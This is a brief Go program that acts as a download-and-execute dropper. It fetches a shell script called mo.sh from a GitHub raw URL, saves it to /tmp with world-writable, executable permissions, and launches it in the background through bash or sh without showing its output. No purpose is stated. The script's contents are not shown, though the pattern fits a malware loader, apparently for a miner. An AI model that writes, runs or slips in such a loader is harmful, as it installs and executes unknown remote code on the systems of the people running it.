package main



import (

"net/http"
"io/ioutil"
"os/exec"
"fmt"
)







//func mo(){


func main () {


cli := http.Client{}

resp , err_get :=   cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/mo.sh")

 

    if err_get != nil { fmt.Println("erro em get" ) ;return }


mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)


  if  err_readall != nil {  return  }

  

     ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
      


        mo := exec.Command("sh",  "-c" ,  "cd /tmp ;  bash mo.sh ||  cd /tmp ; sh mo.sh") 


         mo.Start()





// in new version check   #ATILA_VKZMN  in mo.sh

}




